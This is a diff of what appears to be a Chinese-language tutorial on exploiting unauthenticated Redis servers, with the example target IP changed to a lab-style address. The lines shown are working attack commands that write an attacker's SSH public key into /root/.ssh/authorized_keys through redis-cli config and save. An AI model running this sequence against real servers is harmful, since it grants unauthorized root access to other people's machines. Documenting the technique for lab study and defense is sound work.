@@ -17,7 +17,7 @@ Redis 未授权访问漏洞
 
  ```
  $ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/foo.txt
- $ cat /tmp/foo.txt | redis-cli -h 192.168.1.100 -p 6379 -x set crackit
+ $ cat /tmp/foo.txt | redis-cli -h 172.17.0.2 -p 6379 -x set crackit
  ```
  
  > 加上 `\n\n` 是为了不破坏 ssh public key
@@ -33,9 +33,9 @@ OK
 192.168.1.100:6379> config get dir
 1) "dir"
 2) "/root/.ssh"
-192.168.1.100:6379> config set dbfilename "authorized_keys"
+172.17.0.2:6379> config set dbfilename "authorized_keys"
 OK
-192.168.1.100:6379> save
+172.17.0.2:6379> save
 OK
  ```
  
